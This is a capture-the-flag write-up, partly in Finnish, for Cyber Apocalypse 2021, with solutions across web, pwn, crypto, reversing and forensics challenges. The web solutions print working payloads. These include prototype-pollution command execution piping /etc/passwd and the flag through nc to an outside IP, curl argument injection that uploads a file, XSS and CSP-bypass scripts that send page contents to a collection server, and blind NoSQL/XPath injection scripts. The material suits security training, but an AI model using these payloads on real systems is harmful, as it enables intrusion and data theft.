# Cyber Apocalypse 2021
# Testausserveri.fi writeup
https://testausserveri.fi/

## Web

### Extortion
https://github.com/evyatar9/Writeups/tree/master/CTFs/2021-CTF_HackTheBox/Cyber_Apocalypse_2021/Web-Extortion


### ~~DaaS~~
*Hobbit ja Sanre*

Version: Laravel v8.35.1 (PHP v7.4.16)


http://ip/api/user

https://github.com/ambionics/laravel-exploits
https://github.com/ambionics/phpggc

#### Flag
sijaitsee folderissa /

### ~~Blitzprop~~
*sanre*
Easy - Web

AST-injection in NodeJS / PugJS
	- https://blog.p6.is/AST-Injection/


#### Original request
```
POST /api/submit HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/json
Origin: http://localhost:1337
Content-Length: 35
Connection: close

{"song.name":"The Galactic Rhymes"}
```

#### Exploit
```
POST /api/submit HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/json
Origin: http://localhost:1337
Content-Length: 178
Connection: close


{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`sh -c 'cat /etc/passwd |nc 138.68.185.142 80'`)"
        }
}
```

Keep wiggling on sending the original request and the exploit. The flag will come eventually.. During the CTF, the containers were a BIT wobbly.

#### Flag
```
POST /api/submit HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/json
Origin: http://178.62.50.172:31875
Content-Length: 175
Connection: close

{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`sh -c 'cat /app/flag* |nc 138.68.185.142 80'`)"
        }
}
```

CHTB{p0llute_with_styl3}

### ~~Goose hunt~~

*Antti*

NoSQL injection
Kohteena node.js express servu joka käyttää mongoose.
Clientti lähettää requestit urlencoded mutta servu sallii myös jsonin.
Tämä json sitten heitetään suoraan .find() functioon => nosqli

Injection avulla voidaan sokeasti arvailla kirjaimia ja tarkastella tulosta.

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://206.189.121.131:31899/api/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'Successful' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}

### ~~Inspector Gadget~~

*Antti*

Flagin osaset helposti saatavilla
1. Sivulla
2. Sourcessa
3. Css
4. Konsoli

CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}

### ~~MiniSTRyplace~~

*Antti*

Hakee kielitiedoston laittamalla `?lang=en.php` url perään.

Parametri sanitoidaan korvaamalla kaikki `../` tyhjällä tekstillä.

Tämän voi ohittaa laittamalla kaiken tuplasti `?lang=....//....//flag`

CHTB{b4d_4li3n_pr0gr4m1ng} 

### ~~Caas~~

*Antti*

Sivulle lähetetään urli jonka se curlaa "statuscheck",
php suorittaa curl komennon johon lisätään tää url,
se sanitoidaan konsoli komentojen varalle servun puolelle
ja clientside tarkistaa väärien merkkien varalle.

Manuaalisesti voidaan lähettää esimerkiksi tällänen payload ip fieldissä
joka lähettää tiedoston omalle servulle
`-F "file=@../flag" http://antti.codes:1337/file`

CHTB{f1le_r3trieval_4s_a_s3rv1ce}

### ~~E.Tree~~

*Antti*

Tehtävänä on saada flagi XML tiedoston sisältä ilman että sitä näkee.
Esimerkki tiedostosta tiedämme, että flagi on kahdessa osassa ja nimellä `selfDestructCode`.
Nettisivulla voimme hakea onko staff memberiä olemassa.
Manuaalisesti lähettämällä invalidi pyyntö näemme miten tietoa haetaan:

```python
name = request.json.get("search", "")
query = "/military/district/staff[name='{}']".format(name)
```

Tieto haetaan siis xpathin avulla xml tiedostosta.
Mitään suodatusta ei ole tehty joten voimme suorittaa xpath injection.
Emme voi suoraan hakea tietoa vaan pitää se arvailla sokeasti kuten tehtävässä Goose Hunt.


```python
import requests
import urllib3
import string
urllib3.disable_warnings()

flag = ""
u="http://165.227.232.115:30722/api/search"
headers={'content-type': 'application/json'}

for j in [1,2]:
    l = 0
    for i in range(50):
        payload='{"search": "\' or string-length((//selfDestructCode)[%s])=%s or \'a\'=\'"}' % (j,i)
        r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
        if ("exists" in r.text):
            l = i
            break
    for i in range(1, l + 1):
        for c in string.printable: 
            if c not in ['*','+','.','?','|']:
                payload='{"search": "\' or substring((//selfDestructCode)[%s],%s,1)=\'%s\' or \'a\'=\'"}' % (j,i,c)
                r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
                if ("exists" in r.text): 
                    flag += c
                    print("Flag: " + flag) 
                    break
```

(saadussa flagissa on {} ja _ korvattu merkillä ', tämä pitää manuaalisesti korjata)
CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}

---

### ~~The Galactic Times~~
*sanre*
Difficulty: Medium

The Galactic Times is a monthly Alien newspaper that focuses on news from around the Galaxy. This month's issue is focused on the Human race and contains some very controversial articles. The newspaper reportedly contains a restricted endpoint with some Alien secrets. Can you find a way to view the forbidden pages?

#### Enum
Crawl through the pages and notice links to `/feedback`, `/alien` and `link`

```sh
curl http://localhost:1337/alien
{"message":"Only localhost is allowed"}

curl http://localhost:1337/link
{"message":"Only localhost is allowed"}
```

Fortunately, we have the source code as downloadable from the CTF.
**challenge/public/alien.html**
```xml
<body>
  <div class='clouds'>
     <div class="main__wrapper">
        <main>
           <h1><a href="/alien">⏁⊑⟒ ☌⏃⌰⏃☊⏁⟟☊ ⏁⟟⋔⟒⌇</a></h1>
           <aside>
              <div>
                 <div class="issue">⟟⌇⌇⎍⟒ #256</div>
                 <div class="date">⎎⍀⟟⎅⏃⊬, 29 ⋔⏃⍀☊⊑, 2069</div>
                 <div class="edition">CHTB{f4k3_fl4g_f0r_t3st1ng}</div>
              </div>
```

There is an XSS on the `/feedback` POST-form. This can be validated by simply submitting `<script>alert(1)</script>`. These will be visible in `/links` in a table. 

The source code has interesting file `bot.js`, which includes an interesting package `puppeteer`. See https://pptr.dev/ and also some nice XSS-scanner projects using puppeteer: https://github.com/phra/crosser

Puppeteer is a Node library which provides a high-level API to control Chrome or Chromium over the DevTools Protocol. Puppeteer runs headless by default, but can be configured to run full (non-headless) Chrome or Chromium. 

**bot.js**
```js
const puppeteer = require('puppeteer');

const browser_options = {
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-gpu',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--safebrowsing-disable-auto-update'
    ]
};

async function purgeData(db){
    const browser = await puppeteer.launch(browser_options);
    const page = await browser.newPage();

    await page.goto('http://127.0.0.1:1337/list', {
        waitUntil: 'networkidle2'
    });

    await browser.close();
    await db.migrate();
};

module.exports = { purgeData };
```

Well, there goes the sandbox and safebrowsing... `purgeData` is simply browsing to the `/list` page, and waiting until the page is rendered. `purgeData` is called in index.js every time when a new `feedback` is added. 

**index.js vulnerable code**
```js
fastify.post('/api/submit', async (request, reply) => {
		let { feedback } = request.body;
		
		if (feedback) {
			return db.addFeedback(feedback)
				.then(() => {
					bot.purgeData(db);
					reply.send({ message: 'The Galactic Federation has processed your feedback.' });
				})
				.catch(() => reply.send({ message: 'The Galactic Federation spaceship controller has crashed.', error: 1}));
		}

		return reply.send({ message: 'Missing parameters.', error: 1 });
	});
```

The exploit process is pretty obvious at this point:
	1) Stored XSS
	2) CSRF to exfiltrate the hidden page `/alien` as it contains the flag in HTML

```js
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var adad = xhr.responseText;
				var exfil = new XMLHttpRequest();
				exfil.open("POST", "http://165.227.234.68:80/", true);
				exfil.setRequestHeader("Content-Type","text/plain");
				exfil.send(adad);
    }
}
xhr.open('GET', '/alien', true);
xhr.send(null);
</script>
```

This results to a CSP-deny, check the CSP with an evaluator: https://csp-evaluator.withgoogle.com/. As puppeteer is chromium based, this is quite expectable with proper CSP headers, Firefox would let us go easy.

Notice that `script-src` has a `host` whitelist as:
	script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;

Having cloudflare JS whitelisted, this opens many different routes, such as "importing" some angular functions to play with. With the following code, we should be ablo to extract the hidden `/alien` page as base64 to our C2.

```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };var z=new XMLHttpRequest();z.onreadystatechange=function(){if (z.responseText) location="http://165.227.234.68/?KEKW="+btoa(unescape(encodeURIComponent(z.responseText)))};z.open("GET","http://127.0.0.1/alien",false);z.send();//');}} </div>
```

```
Connection received on 165.227.231.249 56754
GET /?KEKW=PGh0bWwgbGFuZz0iZW4iPgogICA8aGVhZD4KICAgICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgICA8dGl0bGU+VGhlIEdhbGFjdGljIFRpbWVzPC90aXRsZT4KICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCB1c2VyLXNjYWxhYmxlPW5vIj4KICAgICAgPGxpbmsgcmVsPSJpY29uIiBocmVmPSIvc3RhdGljL2ltYWdlcy9mYXZpY29uLnBuZyI+CiAgICAgIDxsa...
gICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgPC9ib2R5Pgo8L2h0bWw+ HTTP/1.1
Host: 165.227.234.68
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4427.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

#### Flag
CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}

### ~~Cessation~~

*Antti*

```conf
# remap.config
regex_map http://.*/shutdown http://127.0.0.1/403
regex_map http://.*/ http://127.0.0.1/
```

Haluamme luultavasti nähdä shutdown sivun. Tämän regex remapin ohittaa helposti tekemällä requesti osotteeseen `//shutdown`

CHTB{c3ss4t10n_n33d_sync1ng_#@$?}

## Pwn

### ~~Controller~~
*Hobbit*

Integer overflow: Eka payload -198 1 3
Ret2libc hyökkäys kun kysytään: "Do you want to report this problem"
Bufferi on 32 et pääsee syöttää komentoja. 
Helppo nakki. 

#### Flag
CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}



## Crypto

### ~~SoulCrabber~~
*Pingnu*

1. [Muutetaan out.txt HEX -> text](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MWI1OTE0ODRkYjk2MmY3NzgyZDE0MTBhZmE0YTM4OGY3OTMwMDY3YmNlZjZkZjU0NmE1N2Q5Zjg3Mw)
3. Muutetaan main.rs:
```diff
diff encode/src/main.rs decode/src/main.rs
22c22
<     let flag = fs::read_to_string("flag.txt")?;
---
>     let flag = fs::read_to_string("out.txt")?;
25c25
<     let mut file = fs::File::create("out.txt")?;
---
>     let mut file = fs::File::create("flag.txt")?;x
```
3. [Otetaan output HEX -> ASCII 7-bit](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Decode_text('US-ASCII%20(7-bit)%20(20127)')&input=NDM0ODU0NDI3YjZkNjU2ZDMwNzI3OTVmNzMzNDY2MzM1ZjYzNzI3OTcwNzQzMDVmNjYzNDMxNmM3ZDYx)

#### Flag
```CHTB{mem0ry_s4f3_crypt0_f41l}```

### ~~SoulCrabber 2~~
*Pingnu*

Alkuperäinen koodi ottaa flagin ja XORaa sen jokaisen char:in (u8) rng:llä jonka seed on UNIX-timestamp.

Alkuperäisen out.txt-tiedoston timestamp on ```Fri Apr 16 14:32:16 2021``` (UTC+3:00), eli ```1618572736```.

Flagin saa takaisin XORaamalla out.txt samalla RNG:llä. Tätä varten [muutetaan out.txt tekstiksi](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NDE4YTUxNzVjMzhjYWY4YzFjYWZhOTJjZGUwNjUzOWQ1MTI4NzE2MDVkMDZiMmQwMWJiYzE2OTZmNGZmNDg3ZTlkNDZiYTBiNWFhZjY1OTgwNw) ja laitetaan se in.txt-tiedostoon.

Koodi käy kaikkien mahdollisten UNIX-timestamppien läpi:
```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::fs;

fn get_rng(seed : u64) -> StdRng {
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input : &String, seed : u64) -> Vec<u8> {
    let mut rng = get_rng(seed);
    return input
        .chars()
        .into_iter()
        .map(|c| (c as u8 ^ rng.gen::<u8>()))
        .collect::<Vec<u8>>();
}

fn main() -> std::io::Result<()> {
    let input = fs::read_to_string("in.txt")?;
    for seed in (0..1618572736).rev() {
        let xored = rand_xor(&input, seed as u64);
        let mut text = String::new();
        for c in xored {
            text.push(c as char);
        }
        if text.contains("CHTB") {
            println!("{}", text);
            break;
        }
    }
    Ok(())
}
```

#### Flag
```CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}```

### ~~Nintendo Base64~~

*Antti*

Come on, 8 kerrosta base64 :p

CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}

### ~~PhaseStream 1~~

*Antti*

XOR 5 tavunen avain. Tiedetään flagin alkavan viidellä merkillä `CHTB{`
joten käyttämällä XOR saamme avaimen mykey jolla sitten lopun tekstin saa luettua.

CHTB{u51ng_kn0wn_pl41nt3xt}

### ~~PhaseStream 2~~

*Antti*

XOR Bruteforce CyberCheffil, käyttää known plaintextiä filteröimiseen
sitten ctrl + f hakee sen flagin niitten 9999 rivin joukosta

CHTB{n33dl3_1n_4_h4yst4ck}

### ~~PhaseStream 3~~

*Sanduuz*

Known plaintext attack?
https://crypto.stackexchange.com/questions/64108/is-it-possible-to-do-a-known-plaintext-attack-with-this-set-up-of-aes-ctr-mode

https://gist.github.com/craSH/2969666

Pienet modaukset ylläolevaan skriptiin ja sit vaa ajaa `python script.py flag_hex`

CHTB{r3u53d_k3Y_4TT4cK}

```python
#!/usr/bin/env python
"""
Simple chosen-plaintext attack on AES-CTR given NONCE and IV re-use for
multiple ciphertexts

Copyleft 2011 Ian Gallagher <crash@neg9.org>
"""
import sys

def decrypt(keystream, ciphertext):
    """
    Given an ordinal list of keystream bytes, and an ordinal list of
    ciphertext, return the binary plaintext string after decryption
    (standard XOR - applicable for AES-CTR mode, etc.)
    """
    pt = ''
    for pos in xrange(len(ciphertext)):
        if pos >= len(keystream):
            print >>sys.stderr, "Ran out of keystream material at pos = %d" % pos
            break
        else:
            pt += chr(ciphertext[pos] ^ keystream[pos])
    return(pt)

def derivekeystream(chosen_ciphertext, chosen_plaintext):
    """
    Given an ordinal list of a chosen plaintext and the corrosponding chosen
    ciphertext, derive AES-CTR keystream and return it as an ordinal list
    """
    return map(lambda x: x[0] ^ x[1], zip(map(ord, chosen_ciphertext), map(ord, chosen_plaintext)))

def main():
    """
    chosen_ciphertext and target_ciphertext should be in the binary encrypted
    format, so prepare it by base64 decoding it, or whatever.

    chosen_plaintext should be in the resulting binary/ASCII format of the
    origial data.
    """
    chosen_plaintext = 'No right of private conversation was enumerated in the Constitution. I don\'t suppose it occurred to anyone at the time that it could be prevented.'
    chosen_ciphertext = 'FHQR(8`9&\xf4B*L\xa6\xd8\x1b\x02\xf3Q\xb4T\xe6\xf9h\xa3$\xfc\xc7}\xa3\x0c\xf9y\xee\xc5|\x86u\xde;\xb9/l!s\x06\x07\x06b&x\n\x8dE9\xfc\xf6\x7f\x9fU\x89\xd1P\xa6\xc7\x86q@\xb5\xa6=\xe2\x97\x1d\xc2\t\xf4\x80\xc2p\x88!\x94\xf2\x88\x16~\xd9\x10\xb6L\xf6\'\xeac\x92Eo\xa1\xb6H\xaf\xd0\xb29\xb5\x96R\xba\xed\xc5\x95\xd4\xf8v4\xcf~\xc4&/\x8c\x95\x81\xd7\xf5m\xc6\xf86\xcf\xe6\x96Q\x8c\xe44\xefF\x16C\x1dM\x1b6\x1c'

    keystream = derivekeystream(chosen_ciphertext, chosen_plaintext)
    target_ciphertext = sys.argv[1]
    target_ciphertext = target_ciphertext.decode("hex")

    print decrypt(keystream, map(ord, target_ciphertext))

if '__main__' == __name__:
	main()
```

### ~~PhaseStream 4~~

*Sanduuz*

CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}

```python
#!/usr/bin/env python

from Crypto.Cipher import AES
from Crypto.Util import Counter

known_plaintext_quote = "I alone cannot change the world, but I can cast a stone across the waters to create many ripples."
known_plaintext_flag = "CHTB{"
cipher_quote = "2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955".decode("hex")
cipher_flag = "2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65".decode("hex")

key = ''.join([chr(i) for i in map(lambda x: x[0] ^ x[1], zip(map(ord, cipher_quote[:len(known_plaintext_quote)]), map(ord, known_plaintext_quote)))])
print("Key: "+repr(key))
print("Quote: "+repr(''.join([chr(i) for i in map(lambda x: x[0] ^ x[1], zip(map(ord, cipher_quote[:len(known_plaintext_quote)]), map(ord, key)))])))
print("Flag: "+repr(''.join([chr(i) for i in map(lambda x: x[0] ^ x[1], zip(map(ord, cipher_flag[:len(known_plaintext_quote)]), map(ord, key)))])))
```

Quote alkoi "I alo", joten veikkasin, että se voisi alkaa sanoilla "I alone" -> Googlasin "quotes starting with I alone" -> löysin quoten: "I alone cannot change the world, but I can cast a stone across the waters to create many ripples" -> Kokeilin sitä ja tuli "CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plain" -> arvasin lopun plaintext_attacks


## Reversing

### ~~Authenticator~~
*DrVilepis*

Printataan checkpin functio suoraan konsoliin ja saadaan tarvittava pin joka submitataan muodossa CHTB{\<pin\>}

original checkpin
```C
undefined8 checkpin(char *param_1)

{
  size_t sVar1;
  int local_24;
  
  local_24 = 0;
  while( true ) {
    sVar1 = strlen(param_1);
    if (sVar1 - 1 <= (ulong)(long)local_24) {
      return 0;
    }
    if ((byte)("}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"[local_24] ^ 9U) != param_1[local_24])
    break;
    local_24 = local_24 + 1;
  }
  return 1;

```
C++ code to get flag
```cpp
#include <iostream>
#include <cstring>

int main()
{
    char* encrypted_string = "}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:";
    std::cout << "CHTB{";
    for (int i = 0; i < strlen(encrypted_string);i++) {

        std::cout << (char) (encrypted_string[i] ^ 9U);
    }
    std::cout << "}";

    return 0;
}
``
```
        

CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}


### ~~Passphrase~~

*Antti*

Tämän olisi voinut tehdä varmaan paljon helpommin mutta tein sen vaikeasti.

Elikkä käyttäen GDB jota en osaa kunnolla selittää.

Komennot:
`gdb passphrase`
`break *main`
`r`
`disass` - eti rivi jolla on `<strcmp@plt>` ja kopioi sen osoite
`del`
`y`
`b *0x0000555555554ac0` - hex arvona se osoite
`r`
`y`
kirjota vaan jotain
`x/s $rax`

CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}

## Forensics

### ~~Oldest Trick~~
*sanre*
Forensics - Easy

A data breach has been identified. The invaders have used the oldest trick in the book. Make sure you can identify what got stolen from us.

#### Pcap

##### DNS
DNS queries, nothing fancy here, something which look like punycode but not quite?
```
tshark -r older_trick.pcap -Y 'dns.cname' -T fields -e frame.number -e dns.qry.name 
tshark: Error loading table 'TLS Decrypt': ssl_keys:2: File '/root/Desktop/HTB/CHALLENGES/MarhsalInTheMiddle/bundle.pem' does not exist or access is denied.
43	R5---Sn-vUxBaVcX-5Uis.goOglevidEo.CoM
49	R5---sn-vuxBaVcX-5uiS.gOOgLEvIDeo.COm
249	r3---Sn-vUXBavcx-5UiZ.GoOgLEViDeO.Com
250	r3---sN-vuxBAvcx-5UIZ.gOOGlEVIDeo.coM
361	LH3.GOOglEuseRCOnTenT.cOM
363	lh3.googleusErCOnTEnt.cOM
509	fontS.GstATiC.cOM
513	fontS.GsTAtic.Com
516	r6---SN-VUXBAVcX-5UI6.gooGleVideO.COM
519	r6---sn-vuXBAVcx-5Ui6.gOogLEVIDeo.coM
729	R3---sn-4G5E6NZz.gOOGLEviDeO.COM
732	R3---sN-4g5e6NZZ.GoOGLevIDEo.Com
1050	yt3.gGPHt.coM
1053	yT3.ggPHt.Com
1104	seCUrePuBads.g.DOUblEcLick.nEt
1191	R1---sN-4G5e6Nzz.GooGLeVIdeo.coM
1195	R1---sn-4G5E6nZZ.goOglEviDEO.Com
4055	R4---Sn-vUxBaVcX-5uiz.gOogLEViDEo.COM
4059	r4---Sn-VuXBaVcx-5uiz.GOoglEvIDeo.Com
4812	r4---SN-4g5EDnLs.gOogLEvidEO.CoM
4815	R4---SN-4g5ednLS.GooGlEvIdEO.COm
14475	R3---Sn-vUxBaVcX-5uIy.GOoGlevIdEo.Com
14479	R3---sn-VUxbAVcx-5UiY.GoOgLevideO.com
14648	r2---SN-vuxBaVcX-5Ui6.gOoGleVIDEo.cOm
14653	R2---Sn-VuxbAVCx-5ui6.gOOglevidEo.coM
28401	r7---sn-VUxBAvCX-5uiZ.GOOGLEvIdeo.CoM
28402	r7---Sn-vuxbavcx-5UIZ.gOoGLeViDEO.cOM
28842	Lh6.GOOgleUSeRcONtenT.com
28845	lH6.goOGLEuseRconteNT.COm
36056	r6---sn-vUXBAvcX-5UID.gOOglEVIdEO.CoM
36058	r6---SN-VuXbavCX-5UiD.goOGLEvideO.cOM
36374	r5---sN-VuxBavCX-5uID.gOoGLeVIDeO.coM
36375	r5---SN-vuXbaVcX-5Uid.GoOglEvIdEo.COm
```

Nothing suspicious there, move on with next filters, as we have no TLS decryption methods available:
	!(tcp.dstport == 443) && !(tcp.srcport == 443)

##### ICMP
There's quite anomalous amount of ICMP-traffic, maybe ICMP-tunneling? Lets inspect the traffic more closely as there seems to be some strings in the packets. Maybe `cookies.sqlite`? Possibly the attacker is stealing the user's browser profile.

```
0000   00 04 00 01 00 06 08 00 27 59 38 62 7d 42 08 00   ........'Y8b}B..
0010   45 00 00 54 79 59 40 00 40 01 3d f0 c0 a8 01 07   E..TyY@.@.=.....
0020   c0 a8 01 08 08 00 77 68 b4 a7 00 01 30 ec 75 60   ......wh....0.u`
0030   00 00 00 00 03 67 00 00 00 00 00 00 00 66 69 6e   .....g.......fin
0040   69 2f 63 6f 6f 6b 69 65 73 2e 73 71 00 66 69 6e   i/cookies.sq.fin
0050   69 2f 63 6f 6f 6b 69 65 73 2e 73 71 00 66 69 6e   i/cookies.sq.fin
0060   69 2f 63 6f                                       i/co
```

Extract ICMP-echo's:
```sh
$ tshark -r older_trick.pcap  -T fields -e data.data icmp.type==8 |tee icmp-echo

$ cat icmp-echo |tr -d "\t\r\n" |tee icmp-raw
```

Convert from hex to binary in py3:
```py
import sys
import binascii

filename = str(sys.argv[1])
if len(sys.argv) > 2:
	file = open(filename,"r")
	f = file.read()
	m = binascii.unhexlify(f)
	w = open("decoded","wb+")
	w.write(m)
	w.close()
else: print("input file missing")
```

Then just `python3 decode.py icmp-raw`

SANS cheatsheet on magic headers
	- https://digital-forensics.sans.org/media/hex_file_and_regex_cheat_sheet.pdf
		zip		50 4B 03 04  

Still seems quite garbled up... Lets see if there are any data to clean

```
5c2c04000000000000000000800000180000000000000000000000008000001800000000000000000000000080000018
fc480400000000000020000000a769020066696e692f77650020000000a769020066696e692f77650020000000a76902
a65e040000000000626170707373746f72652e73716c6974626170707373746f72652e73716c6974626170707373746f
577404000000000065504b010214001400000008001aa38d65504b010214001400000008001aa38d65504b0102140014
ad89040000000000523c4e43d697000000008000001c0000523c4e43d697000000008000001c0000523c4e43d6970000
239f0400000000000000000000000020000000446a0200660000000000000020000000446a0200660000000000000020
02d1040000000000696e692f7765626170707373746f7265696e692f7765626170707373746f7265696e692f77656261
84e80400000000002e73716c6974652d73686d504b0102142e73716c6974652d73686d504b0102142e73716c6974652d
5fff04000000000000140000000800e19e8d52199817e0b800140000000800e19e8d52199817e0b800140000000800e1
3f1e050000000000020000988002001c0000000000000001020000988002001c0000000000000001020000988002001c
a5440500000000000020000000156b020066696e692f77650020000000156b020066696e692f77650020000000156b02
7e93050000000000626170707373746f72652e73716c6974626170707373746f72652e73716c6974626170707373746f
e4a9050000000000652d77616c504b010214001400000008652d77616c504b010214001400000008652d77616c504b01
05cc0500000000000068098d52f6a8580e6b0000008c00000068098d52f6a8580e6b0000008c00000068098d52f6a858
96e205000000000000120000000000000001002000000007001200000000000000010020000000070012000000000000
37f90500000000006e020066696e692f78756c73746f72656e020066696e692f78756c73746f72656e020066696e692f
240f0600000000002e6a736f6e504b0506000000002400242e6a736f6e504b0506000000002400242e6a736f6e504b05
612f0600000000000093090000a26e0200000000000000000093090000a26e0200000000000000000093090000a26e02
```

First 8 bytes looks to be prefixed, those first 3 bytes are pretty odd as well, maybe try including them later. 

Use `awk` to remove first 8 bytes

```sh
tshark -r older_trick.pcap  -T fields -e data.data icmp.type==8 |awk '{print substr ($0, 17)}' | tee icmp-echo
```

```
00000000800000180000000000000000000000008000001800000000000000000000000080000018
0020000000a769020066696e692f77650020000000a769020066696e692f77650020000000a76902
626170707373746f72652e73716c6974626170707373746f72652e73716c6974626170707373746f
65504b010214001400000008001aa38d65504b010214001400000008001aa38d65504b0102140014
523c4e43d697000000008000001c0000523c4e43d697000000008000001c0000523c4e43d6970000
0000000000000020000000446a0200660000000000000020000000446a0200660000000000000020
696e692f7765626170707373746f7265696e692f7765626170707373746f7265696e692f77656261
2e73716c6974652d73686d504b0102142e73716c6974652d73686d504b0102142e73716c6974652d
00140000000800e19e8d52199817e0b800140000000800e19e8d52199817e0b800140000000800e1
020000988002001c0000000000000001020000988002001c0000000000000001020000988002001c
0020000000156b020066696e692f77650020000000156b020066696e692f77650020000000156b02
626170707373746f72652e73716c6974626170707373746f72652e73716c6974626170707373746f
652d77616c504b010214001400000008652d77616c504b010214001400000008652d77616c504b01
0068098d52f6a8580e6b0000008c00000068098d52f6a8580e6b0000008c00000068098d52f6a858
00120000000000000001002000000007001200000000000000010020000000070012000000000000
6e020066696e692f78756c73746f72656e020066696e692f78756c73746f72656e020066696e692f
2e6a736f6e504b0506000000002400242e6a736f6e504b0506000000002400242e6a736f6e504b05
0093090000a26e0200000000000000000093090000a26e0200000000000000000093090000a26e02
```

Seems that every 16 bytes on each line are duplicated, see the sample data above with full lines.. Lets approach this way and starting with the original data from icmp body:
	1) Remove the prefix 8 bytes
	2) Take only the first 16 bytes each line and re-do the decoding

```sh
$ cat icmp-orig |awk '{print substr ($0, 17)}' |cut -c 1-32 |tr -d "\t\r\n" |tee tmp
python3 decode.py tmp

$ unzip -l decoded
Archive:  decoded
  Length      Date    Time    Name
---------  ---------- -----   ----
       24  2021-04-13 19:51   fini/addons.json
     2663  2021-04-13 20:24   fini/addonStartup.json.lz4
      216  2021-04-13 20:26   fini/broadcast-listeners.json
   229376  2021-04-13 01:02   fini/cert9.db
      197  2021-04-13 01:00   fini/compatibility.ini
      939  2021-04-13 01:01   fini/containers.json
   229376  2021-04-13 20:33   fini/content-prefs.sqlite
   524288  2021-04-13 20:33   fini/cookies.sqlite
    32768  2021-04-13 20:24   fini/cookies.sqlite-shm
   524704  2021-04-13 20:34   fini/cookies.sqlite-wal
     1027  2021-04-13 01:13   fini/extension-preferences.json
    36584  2021-04-13 19:51   fini/extensions.json
  5242880  2021-04-13 01:01   fini/favicons.sqlite
    32768  2021-04-13 20:24   fini/favicons.sqlite-shm
  1311712  2021-04-13 20:34   fini/favicons.sqlite-wal
   262144  2021-04-13 20:33   fini/formhistory.sqlite
      683  2021-04-13 01:01   fini/handlers.json
   294912  2021-04-13 19:54   fini/key4.db
      669  2021-04-13 19:54   fini/logins.json
    98304  2021-04-13 20:34   fini/permissions.sqlite
      504  2021-04-13 01:01   fini/pkcs11.txt
  5242880  2021-04-13 20:33   fini/places.sqlite
    32768  2021-04-13 20:24   fini/places.sqlite-shm
  2328264  2021-04-13 20:33   fini/places.sqlite-wal
    11743  2021-04-13 20:25   fini/prefs.js
    65536  2021-04-13 20:33   fini/protections.sqlite
      180  2021-04-13 20:24   fini/search.json.mozlz4
       90  2021-04-13 20:24   fini/sessionCheckpoints.json
